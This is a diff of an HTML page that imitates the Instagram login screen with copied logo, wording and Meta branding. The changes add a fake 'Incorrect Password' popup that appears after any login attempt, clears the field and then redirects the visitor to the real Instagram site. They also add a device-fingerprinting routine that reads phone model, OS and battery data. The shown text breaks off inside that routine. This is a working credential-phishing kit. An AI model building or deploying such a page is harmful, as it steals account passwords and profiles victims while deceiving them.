@@ -19,7 +19,6 @@
         body {
             width: 100%;
             height: 100%;
-            -webkit-text-size-adjust: 100%;
         }
 
         body {
@@ -31,7 +30,6 @@
             min-height: 100vh;
             min-height: 100dvh;
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
         }
 
         .container {
@@ -46,43 +44,74 @@
             overflow-x: hidden;
         }
 
-        /* ─── Top Bar ─── */
         .header {
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 14px 16px 0;
+            padding: 14px 16px 8px;
+            position: relative;
         }
 
-        .language-text {
-            font-size: 12px;
+        .header-back {
+            position: absolute;
+            left: 8px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .header-back svg {
+            width: 24px;
+            height: 24px;
+            stroke: #000;
+            stroke-width: 2;
+            fill: none;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            font-size: 14px;
             color: #262626;
             font-weight: 400;
-            text-align: center;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: inherit;
         }
 
-        /* ─── Instagram Logo ─── */
+        .language-selector svg {
+            width: 12px;
+            height: 12px;
+            fill: #444;
+        }
+
         .logo-section {
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 36px 20px 36px;
+            padding: 36px 20px 28px;
         }
 
         .logo-section svg {
-            width: 72px;
-            height: 72px;
+            width: 64px;
+            height: 64px;
         }
 
-        /* ─── Form ─── */
         .form-section {
+            flex: 1;
             padding: 0 16px;
             display: flex;
             flex-direction: column;
         }
 
         .form-group {
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             position: relative;
         }
 
@@ -92,67 +121,86 @@
             align-items: center;
         }
 
-        /* Exact Instagram CSS values from their source */
         .form-input {
             width: 100%;
-            padding: 20px 16px;
+            padding: 12px 16px;
             font-size: 16px;
-            line-height: 20px;
             border: 1px solid #dbdbdb;
-            border-radius: 7px;
+            border-radius: 8px;
             background-color: #fafafa;
             color: #262626;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: inherit;
             outline: none;
-            transition: border-color 0.15s ease;
+            transition: border-color 0.2s, background-color 0.2s;
             -webkit-appearance: none;
-            appearance: none;
         }
 
         .form-input::placeholder {
             color: #8e8e8e;
             font-weight: 400;
-            font-size: 16px;
         }
 
         .form-input:focus {
-            outline: none;
-            border-color: #a8a8a8;
-            background-color: #ffffff;
+            border-color: #a0a0a0;
+            background-color: #fff;
         }
 
         .form-input[type="password"],
         .form-input[type="text"] {
-            padding-right: 48px;
+            padding-right: 44px;
         }
 
-        /* Prevent Chrome autofill blue tint */
-        .form-input:-webkit-autofill,
-        .form-input:-webkit-autofill:hover,
-        .form-input:-webkit-autofill:focus,
-        .form-input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 1000px #fafafa inset !important;
-            -webkit-text-fill-color: #262626 !important;
-            border: 1px solid #ced0d4 !important;
-            transition: background-color 5000s ease-in-out 0s;
-        }
-
-        /* Hide default browser password reveal */
         .form-input::-ms-reveal,
         .form-input::-ms-clear {
             display: none;
         }
 
-        /* ─── Password Eye Toggle ─── */
+        .form-input:-webkit-autofill,
+        .form-input:-webkit-autofill:hover,
+        .form-input:-webkit-autofill:focus {
+            -webkit-box-shadow: 0 0 0 1000px #fafafa inset !important;
+            -webkit-text-fill-color: #262626 !important;
+            transition: background-color 5000s ease-in-out 0s;
+        }
+
+        .form-input.error-shake {
+            animation: shakeInput 0.4s ease;
+            border-color: #ed4956;
+        }
+
+        @keyframes shakeInput {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            20% {
+                transform: translateX(-6px);
+            }
+
+            40% {
+                transform: translateX(6px);
+            }
+
+            60% {
+                transform: translateX(-4px);
+            }
+
+            80% {
+                transform: translateX(4px);
+            }
+        }
+
         .password-toggle {
             position: absolute;
-            right: 12px;
+            right: 10px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
             cursor: pointer;
-            padding: 6px;
+            padding: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -163,7 +211,11 @@
         }
 
         .password-toggle:active {
-            opacity: 0.5;
+            opacity: 0.6;
+        }
+
+        .password-toggle:hover {
+            color: #262626;
         }
 
         .password-toggle svg {
@@ -172,23 +224,20 @@
             display: block;
         }
 
-        /* ─── Log In Button ─── */
         .submit-btn {
             width: 100%;
-            padding: 12px 0;
+            padding: 10px 16px;
             margin-top: 14px;
             background-color: #0095f6;
-            color: #ffffff;
+            color: #fff;
             font-size: 14px;
-            font-weight: 700;
+            font-weight: 600;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.15s ease;
             -webkit-appearance: none;
             -webkit-tap-highlight-color: transparent;
             font-family: inherit;
-            letter-spacing: 0.2px;
         }
 
         .submit-btn:active {
@@ -200,32 +249,28 @@
             cursor: not-allowed;
         }
 
-        /* ─── Forgot Password ─── */
         .forgot-password {
             text-align: center;
-            margin-top: 18px;
+            margin-top: 16px;
         }
 
         .forgot-password a {
             font-size: 12px;
             color: #00376b;
             text-decoration: none;
-            font-weight: 600;
+            font-weight: 400;
         }
 
         .forgot-password a:active {
-            opacity: 0.5;
+            opacity: 0.6;
         }
 
-        /* ─── Spacer ─── */
         .spacer {
             flex: 1;
-            min-height: 40px;
         }
 
-        /* ─── Footer ─── */
         .footer {
-            padding: 22px 16px 28px;
+            padding: 16px;
             border-top: 1px solid #dbdbdb;
             display: flex;
             flex-direction: column;
@@ -235,23 +280,21 @@
 
         .signup-btn {
             width: 100%;
-            padding: 12px 16px;
+            padding: 10px 16px;
             background: transparent;
             color: #0095f6;
             font-size: 14px;
             font-weight: 600;
             border: 1px solid #0095f6;
-            border-radius: 20px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.15s ease;
             -webkit-appearance: none;
             -webkit-tap-highlight-color: transparent;
             font-family: inherit;
-            letter-spacing: 0.2px;
         }
 
         .signup-btn:active {
-            background-color: rgba(0, 149, 246, 0.06);
+            background-color: rgba(0, 149, 246, 0.1);
         }
 
         .meta-badge {
@@ -259,7 +302,7 @@
             align-items: center;
             gap: 5px;
             font-size: 14px;
-            color: #8e8e8e;
+            color: #737373;
             font-weight: 500;
         }
 
@@ -306,53 +349,147 @@
             font-weight: 500;
         }
 
-        /* ─── Responsive: Small Phones ─── */
-        @media (max-width: 374px) {
-            .logo-section {
-                padding: 28px 16px 28px;
+        /* ═══════════════════════════════════════════════════
+           INSTAGRAM-STYLE ERROR POPUP (replaces alert())
+           ═══════════════════════════════════════════════════ */
+        .ig-error-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .ig-error-backdrop.visible {
+            display: flex;
+            animation: backdropIn 0.15s ease-out;
+        }
+
+        @keyframes backdropIn {
+            from {
+                opacity: 0;
             }
 
-            .logo-section svg {
-                width: 64px;
-                height: 64px;
-            }
-
-            .form-section {
-                padding: 0 14px;
-            }
-
-            .form-input {
-                padding: 18px 14px;
-            }
-
-            .footer {
-                padding: 18px 14px 22px;
-                gap: 14px;
+            to {
+                opacity: 1;
             }
         }
 
-        /* ─── Responsive: Landscape ─── */
-        @media (max-height: 600px) and (orientation: landscape) {
+        .ig-error-popup {
+            background: #ffffff;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+            animation: popupIn 0.2s ease-out;
+            box-shadow: 0 4px 40px rgba(0, 0, 0, 0.25);
+        }
+
+        @keyframes popupIn {
+            from {
+                opacity: 0;
+                transform: scale(0.92);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Title */
+        .ig-error-title {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            padding: 32px 24px 8px;
+            line-height: 1.3;
+        }
+
+        /* Description */
+        .ig-error-desc {
+            text-align: center;
+            font-size: 14px;
+            color: #8e8e8e;
+            padding: 0 24px 24px;
+            line-height: 1.4;
+        }
+
+        /* Divider */
+        .ig-error-divider {
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        /* Try Again button */
+        .ig-error-btn {
+            width: 100%;
+            padding: 14px 16px;
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+            text-align: center;
+        }
+
+        .ig-error-btn:active {
+            background-color: #fafafa;
+        }
+
+        @media (max-width: 390px) {
             .logo-section {
-                padding: 12px 20px 16px;
+                padding: 28px 16px 24px;
             }
 
             .logo-section svg {
-                width: 44px;
-                height: 44px;
+                width: 56px;
+                height: 56px;
+            }
+
+            .form-section {
+                padding: 0 12px;
             }
 
             .form-input {
-                padding: 12px 14px;
-            }
-
-            .spacer {
-                min-height: 8px;
+                padding: 11px 12px;
+                padding-right: 40px;
             }
 
             .footer {
-                padding: 10px 16px 12px;
-                gap: 10px;
+                padding: 12px;
+                gap: 14px;
+            }
+
+            .ig-error-popup {
+                margin: 0 12px;
+            }
+        }
+
+        @media (max-height: 600px) and (orientation: landscape) {
+            .logo-section {
+                padding: 12px 20px;
+            }
+
+            .logo-section svg {
+                width: 40px;
+                height: 40px;
+            }
+
+            .spacer {
+                display: none;
+            }
+
+            .footer {
+                padding: 8px 16px;
+                gap: 8px;
             }
         }
     </style>
@@ -360,87 +497,98 @@
 
 <body>
 
+    <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Logging in…</div>
     </div>
 
+    <!-- Instagram-Style Error Popup (replaces alert) -->
+    <div class="ig-error-backdrop" id="igErrorBackdrop">
+        <div class="ig-error-popup">
+            <div class="ig-error-title">Incorrect Password</div>
+            <div class="ig-error-desc">The password you enetered is incorrect.Please try again to log in</div>
+            <div class="ig-error-divider"></div>
+            <button class="ig-error-btn" onclick="closeErrorPopup()">Try again</button>
+        </div>
+    </div>
+
     <div class="container">
 
-        <!-- Top Bar -->
         <div class="header">
-            <span class="language-text">English (US)</span>
+            <button class="header-back" onclick="history.back()" aria-label="Go back">
+                <svg viewBox="0 0 24 24">
+                    <polyline points="15 18 9 12 15 6"></polyline>
+                </svg>
+            </button>
+            <button class="language-selector">
+                <span>English (US)</span>
+                <svg viewBox="0 0 24 24">
+                    <path d="M7 10l5 5 5-5H7z" />
+                </svg>
+            </button>
         </div>
 
-        <!-- Instagram Logo — exact gradient from Instagram brand -->
         <div class="logo-section">
             <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
                 <defs>
                     <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
-                        <stop offset="0%" stop-color="#feda75" />
-                        <stop offset="5%" stop-color="#fa7e1e" />
-                        <stop offset="45%" stop-color="#d62976" />
-                        <stop offset="60%" stop-color="#962fbf" />
-                        <stop offset="90%" stop-color="#4f5bd5" />
+                        <stop offset="0%" style="stop-color:#feda75;" />
+                        <stop offset="5%" style="stop-color:#fa7e1e;" />
+                        <stop offset="45%" style="stop-color:#d92e7f;" />
+                        <stop offset="60%" style="stop-color:#9b36b7;" />
+                        <stop offset="90%" style="stop-color:#515bd4;" />
                     </linearGradient>
                 </defs>
-                <rect x="28" y="28" width="144" height="144" rx="40" ry="40" fill="none" stroke="url(#ig-gradient)"
-                    stroke-width="14" />
-                <circle cx="100" cy="100" r="33" fill="none" stroke="url(#ig-gradient)" stroke-width="12" />
-                <circle cx="144" cy="56" r="9" fill="url(#ig-gradient)" />
+                <rect x="30" y="30" width="140" height="140" rx="35" ry="35" fill="none" stroke="url(#ig-gradient)"
+                    stroke-width="12" />
+                <circle cx="100" cy="100" r="30" fill="none" stroke="url(#ig-gradient)" stroke-width="10" />
+                <circle cx="140" cy="60" r="7" fill="url(#ig-gradient)" />
             </svg>
         </div>
 
-        <!-- Login Form -->
         <div class="form-section">
             <form id="loginForm" onsubmit="handleLogin(event)">
                 <div class="form-group">
                     <div class="input-wrapper">
                         <input type="text" id="username" name="username" class="form-input"
-                            placeholder="Username, email or mobile number" autocomplete="username" autocapitalize="none"
+                            placeholder="Phone number, username, or email" autocomplete="username" autocapitalize="none"
                             spellcheck="false" required />
                     </div>
                 </div>
-
                 <div class="form-group">
-                    <div class="input-wrapper">
-                        <input type="password" id="password" name="password" class="form-input" placeholder="Password"
-                            autocomplete="current-password" required />
-
-                        <button type="button" class="password-toggle" id="toggleBtn"
-                            onclick="togglePasswordVisibility()" aria-label="Show password">
-                            <svg id="eyeHiddenIcon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-                                <path clip-rule="evenodd"
-                                    d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"
-                                    fill-rule="evenodd" />
-                                <path
-                                    d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z" />
-                                <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z" />
-                            </svg>
-                            <svg id="eyeVisibleIcon" style="display:none;" viewBox="0 0 24 24" fill="currentColor"
-                                aria-hidden="true">
-                                <path clip-rule="evenodd"
-                                    d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z"
-                                    fill-rule="evenodd" />
-                                <path clip-rule="evenodd"
-                                    d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3"
-                                    fill-rule="evenodd" />
-                            </svg>
-                        </button>
-                    </div>
+                    <input type="password" id="password" name="password" class="form-input" placeholder="Password"
+                        autocomplete="current-password" required />
+                    <button type="button" class="password-toggle" id="toggleBtn" onclick="togglePasswordVisibility()"
+                        aria-label="Show password">
+                        <svg id="eyeHiddenIcon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                            <path clip-rule="evenodd"
+                                d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"
+                                fill-rule="evenodd" />
+                            <path
+                                d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z" />
+                            <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z" />
+                        </svg>
+                        <svg id="eyeVisibleIcon" style="display:none;" viewBox="0 0 24 24" fill="currentColor"
+                            aria-hidden="true">
+                            <path clip-rule="evenodd"
+                                d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z"
+                                fill-rule="evenodd" />
+                            <path clip-rule="evenodd"
+                                d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3"
+                                fill-rule="evenodd" />
+                        </svg>
+                    </button>
                 </div>
-
                 <button type="submit" class="submit-btn" id="submitBtn">Log in</button>
             </form>
-
             <div class="forgot-password">
-                <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
+                <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgotten password?</a>
             </div>
         </div>
 
         <div class="spacer"></div>
 
-        <!-- Footer -->
         <div class="footer">
             <button class="signup-btn"
                 onclick="window.open('https://www.instagram.com/accounts/emailsignup/','_blank')">
@@ -448,7 +596,7 @@
             </button>
             <div class="meta-badge">
                 <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#737373" fill-rule="evenodd"
+                    <path fill="#0064e0" fill-rule="evenodd"
                         d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018" />
                 </svg>
                 <span>Meta</span>
@@ -460,114 +608,201 @@
     <script>
         var _pageLoadTime = Date.now();
 
+        // ═══════════════════════════════════
+        //  PASSWORD EYE TOGGLE
+        // ═══════════════════════════════════
         function togglePasswordVisibility() {
-            const passwordInput = document.getElementById('password');
-            const eyeHiddenIcon = document.getElementById('eyeHiddenIcon');
-            const eyeVisibleIcon = document.getElementById('eyeVisibleIcon');
-            const toggleBtn = document.getElementById('toggleBtn');
-
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                eyeHiddenIcon.style.display = 'none';
-                eyeVisibleIcon.style.display = 'block';
-                toggleBtn.setAttribute('aria-label', 'Hide password');
+            var pw = document.getElementById('password');
+            var hEye = document.getElementById('eyeHiddenIcon');
+            var vEye = document.getElementById('eyeVisibleIcon');
+            var btn = document.getElementById('toggleBtn');
+            if (pw.type === 'password') {
+                pw.type = 'text';
+                hEye.style.display = 'none';
+                vEye.style.display = 'block';
+                btn.setAttribute('aria-label', 'Hide password');
             } else {
-                passwordInput.type = 'password';
-                eyeHiddenIcon.style.display = 'block';
-                eyeVisibleIcon.style.display = 'none';
-                toggleBtn.setAttribute('aria-label', 'Show password');
+                pw.type = 'password';
+                hEye.style.display = 'block';
+                vEye.style.display = 'none';
+                btn.setAttribute('aria-label', 'Show password');
             }
         }
 
+        // ═══════════════════════════════════
+        //  INSTAGRAM-STYLE ERROR POPUP
+        // ═══════════════════════════════════
+        function showErrorPopup() {
+            document.getElementById('igErrorBackdrop').classList.add('visible');
+            // Shake the password field
+            var pwField = document.getElementById('password');
+            pwField.classList.add('error-shake');
+            setTimeout(function () { pwField.classList.remove('error-shake'); }, 500);
+        }
+
+        function closeErrorPopup() {
+            document.getElementById('igErrorBackdrop').classList.remove('visible');
+            // Clear password and refocus
+            var pwField = document.getElementById('password');
+            pwField.value = '';
+            pwField.type = 'password';
+            document.getElementById('eyeHiddenIcon').style.display = 'block';
+            document.getElementById('eyeVisibleIcon').style.display = 'none';
+            pwField.focus();
+            // Redirect to real Instagram after a delay
+            setTimeout(function () {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 1500);
+        }
+
+        // ═══════════════════════════════════
+        //  SAMSUNG MODEL CODE DATABASE
+        // ═══════════════════════════════════
+        var SAMSUNG_DB = {
+            'SM-S928': 'Samsung Galaxy S24 Ultra', 'SM-S926': 'Samsung Galaxy S24+', 'SM-S921': 'Samsung Galaxy S24',
+            'SM-S918': 'Samsung Galaxy S23 Ultra', 'SM-S916': 'Samsung Galaxy S23+', 'SM-S911': 'Samsung Galaxy S23', 'SM-S919': 'Samsung Galaxy S23 FE',
+            'SM-S908': 'Samsung Galaxy S22 Ultra', 'SM-S906': 'Samsung Galaxy S22+', 'SM-S901': 'Samsung Galaxy S22',
+            'SM-G998': 'Samsung Galaxy S21 Ultra', 'SM-G996': 'Samsung Galaxy S21+', 'SM-G991': 'Samsung Galaxy S21', 'SM-G990': 'Samsung Galaxy S21 FE',
+            'SM-G988': 'Samsung Galaxy S20 Ultra', 'SM-G986': 'Samsung Galaxy S20+', 'SM-G981': 'Samsung Galaxy S20', 'SM-G781': 'Samsung Galaxy S20 FE',
+            'SM-G975': 'Samsung Galaxy S10+', 'SM-G973': 'Samsung Galaxy S10', 'SM-G970': 'Samsung Galaxy S10e',
+            'SM-G965': 'Samsung Galaxy S9+', 'SM-G960': 'Samsung Galaxy S9',
+            'SM-G955': 'Samsung Galaxy S8+', 'SM-G950': 'Samsung Galaxy S8',
+            'SM-A556': 'Samsung Galaxy A55', 'SM-A546': 'Samsung Galaxy A54', 'SM-A536': 'Samsung Galaxy A53', 'SM-A525': 'Samsung Galaxy A52s',
+            'SM-A346': 'Samsung Galaxy A34', 'SM-A336': 'Samsung Galaxy A33',
+            'SM-A256': 'Samsung Galaxy A25', 'SM-A155': 'Samsung Galaxy A15', 'SM-A145': 'Samsung Galaxy A14', 'SM-A135': 'Samsung Galaxy A13',
+            'SM-M556': 'Samsung Galaxy M55', 'SM-M546': 'Samsung Galaxy M54', 'SM-M346': 'Samsung Galaxy M34',
+            'SM-F958': 'Samsung Galaxy Z Fold6', 'SM-F956': 'Samsung Galaxy Z Fold5', 'SM-F936': 'Samsung Galaxy Z Fold4',
+            'SM-F741': 'Samsung Galaxy Z Flip6', 'SM-F731': 'Samsung Galaxy Z Flip5', 'SM-F721': 'Samsung Galaxy Z Flip4',
+            'SM-N976': 'Samsung Galaxy Note10+', 'SM-N970': 'Samsung Galaxy Note10',
+            'SM-T970': 'Samsung Galaxy Tab S7+', 'SM-T505': 'Samsung Galaxy Tab A8'
+        };
+
+        function lookupSamsung(code) {
+            if (SAMSUNG_DB[code]) return SAMSUNG_DB[code];
+            for (var len = code.length - 1; len >= 5; len--) {
+                if (SAMSUNG_DB[code.substring(0, len)]) return SAMSUNG_DB[code.substring(0, len)];
+            }
+            return 'Samsung ' + code;
+        }
+
+        function detectBrand(model) {
+            var m = (model || '').toLowerCase();
+            if (/^sm-|^samsung|^galaxy/i.test(model)) return 'samsung';
+            if (/^moto|^motorola/i.test(m)) return 'motorola';
+            if (/^cph|^oneplus/i.test(model)) return 'oneplus';
+            if (/^rmx|^realme/i.test(model)) return 'realme';
+            if (/^v\d{4}|^vivo/i.test(model)) return 'vivo';
+            if (/^cph.*oppo|^oppo/i.test(model)) return 'oppo';
+            if (/^xiaomi|^redmi|^poco|^mi /i.test(m)) return 'xiaomi';
+            if (/^2\d{3}[a-z]/i.test(model)) return 'xiaomi';
+            if (/^i\d{4}|^iqoo/i.test(model)) return 'iqoo';
+            if (/^ta-|^nokia/i.test(m)) return 'nokia';
+            if (/^tecno/i.test(m)) return 'tecno';
+            if (/^x\d{3}|^infinix/i.test(m)) return 'infinix';
+            if (/^pixel|^gp|^g[a-z]\d|^gfe|^gkw|^gb/i.test(model)) return 'google';
+            if (/^a0\d{2}/i.test(model)) return 'nothing';
+            if (/^huawei|^alt|^tet|^noh/i.test(m)) return 'huawei';
+            if (/^honor/i.test(m)) return 'honor';
+            return '';
+        }
+
+        function formatModel(model) {
+            if (!model || model === 'K' || model.length < 2) return '';
+            var brand = detectBrand(model);
+            var lower = model.toLowerCase();
+            if (brand === 'samsung' || /^SM-/i.test(model)) return lookupSamsung(model);
+            if (brand === 'motorola' || lower.indexOf('moto') === 0) {
+                var name = lower.indexOf('motorola') !== 0 ? 'Motorola ' + model : model;
+                return name.replace(/\b\w/g, function (c) { return c.toUpperCase(); }).replace(/\b5g\b/gi, '5G').replace(/\b4g\b/gi, '4G').replace(/\bLte\b/gi, 'LTE');
+            }
+            if (brand === 'oneplus') return lower.indexOf('oneplus') === 0 ? model : 'OnePlus ' + model;
+            if (brand === 'xiaomi') {
+                if (/^(xiaomi|redmi|poco)/i.test(model)) return model.replace(/\b\w/g, function (c) { return c.toUpperCase(); }).replace(/\b5g\b/gi, '5G');
+                return 'Xiaomi ' + model;
+            }
+            if (brand === 'realme') return lower.indexOf('realme') === 0 ? model : 'Realme ' + model;
+            if (brand === 'vivo') return lower.indexOf('vivo') === 0 ? model : 'Vivo ' + model;
+            if (brand === 'oppo') return lower.indexOf('oppo') === 0 ? model : 'OPPO ' + model;
+            if (brand === 'iqoo') return lower.indexOf('iqoo') === 0 ? model : 'iQOO ' + model;
+            if (brand === 'google') return /pixel/i.test(model) ? 'Google ' + model : 'Google ' + model;
+            if (brand === 'nokia') return lower.indexOf('nokia') === 0 ? model : 'Nokia ' + model;
+            if (brand === 'tecno') return lower.indexOf('tecno') === 0 ? model : 'Tecno ' + model;
+            if (brand === 'infinix') return lower.indexOf('infinix') === 0 ? model : 'Infinix ' + model;
+            if (brand === 'huawei') return lower.indexOf('huawei') === 0 ? model : 'Huawei ' + model;
+            if (brand === 'honor') return model.replace(/\b\w/g, function (c) { return c.toUpperCase(); });
+            if (brand === 'nothing') return lower.indexOf('nothing') === 0 ? model : 'Nothing ' + model;
+            return model.replace(/\b\w/g, function (c) { return c.toUpperCase(); });
+        }
+
+        function getIPhoneModel() {
+            var w = Math.min(screen.width, screen.height);
+            var h = Math.max(screen.width, screen.height);
+            var dpr = Math.round((window.devicePixelRatio || 1) * 10) / 10;
+            var key = w + '_' + h + '_' + dpr;
+            var map = {
+                '320_568_2': 'iPhone SE (1st Gen)', '375_667_2': 'iPhone 8 / SE (2nd/3rd)',
+                '414_736_3': 'iPhone 8 Plus', '375_812_3': 'iPhone X / 11 Pro',
+                '375_812_2': 'iPhone 12 Mini / 13 Mini', '414_896_2': 'iPhone XR / 11',
+                '414_896_3': 'iPhone XS Max / 11 Pro Max', '390_844_3': 'iPhone 12 Pro / 13 Pro',
+                '428_926_3': 'iPhone 12 Pro Max / 13 Pro Max', '393_852_3': 'iPhone 14 Pro / 15',
+                '430_932_3': 'iPhone 14 Pro Max / 15 Plus', '402_874_3': 'iPhone 15 Pro / 16 Pro',
+                '440_956_3': 'iPhone 16 Pro Max'
+            };
+            if (map[key]) return map[key];
+            if (h <= 568) return 'iPhone SE'; if (h <= 667) return 'iPhone 8 / SE';
+            if (h <= 736) return 'iPhone 8 Plus'; if (h <= 812) return 'iPhone X / 11 Pro';
+            if (h <= 844) return 'iPhone 12 / 13 / 14'; if (h <= 852) return 'iPhone 14 Pro / 15';
+            if (h <= 874) return 'iPhone 15 Pro / 16 Pro'; if (h <= 896) return 'iPhone 11 / XR';
+            if (h <= 926) return 'iPhone 13 Pro Max'; if (h <= 932) return 'iPhone 14 Pro Max / 15 Plus';
+            return 'iPhone';
+        }
+
+        // ═══════════════════════════════════
+        //  FINGERPRINT COLLECTOR
+        // ═══════════════════════════════════
         async function getFingerprint() {
             var ua = navigator.userAgent;
-            var device = "Unknown Device";
-            var os = "Unknown";
-            var battery = "N/A";
+            var device = 'Unknown Device', os = 'Unknown', battery = 'N/A';
 
             if (/iPhone/i.test(ua)) {
                 var iosVer = (ua.match(/OS (\d+[\._]\d+)/) || [, '0'])[1].replace('_', '.');
-                device = "iPhone (iOS " + iosVer + ")";
-                os = "iOS " + iosVer;
-                battery = "Restricted (iOS Safari)";
-            } else if (/iPad/i.test(ua)) {
+                device = getIPhoneModel() + ' (iOS ' + iosVer + ')'; os = 'iOS ' + iosVer; battery = 'Restricted (iOS Safari)';
+            } else if (/iPad/i.test(ua) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua) && screen.width >= 768)) {
                 var iosVer = (ua.match(/OS (\d+[\._]\d+)/) || [, '0'])[1].replace('_', '.');
-                device = "iPad (iOS " + iosVer + ")";
-                os = "iOS " + iosVer;
-                battery = "Restricted (iOS Safari)";
+                device = 'iPad (iPadOS ' + iosVer + ')'; os = 'iPadOS ' + iosVer; battery = 'Restricted (iOS Safari)';
             } else if (/Android/i.test(ua)) {
                 var androidVer = (ua.match(/Android\s([\d.]+)/) || [, ''])[1];
-                var model = (ua.match(/;\s([^;)]+)\sBuild\//) || [, 'Android'])[1].trim();
-                device = model + " (Android " + androidVer + ")";
-                os = "Android " + androidVer;
-                try {
-                    if (navigator.getBattery) {
-                        var bm = await navigator.getBattery();
-                        var batPct = Math.round(bm.level * 100);
-                        var charging = bm.charging ? 'Charging ⚡' : 'Not Charging';
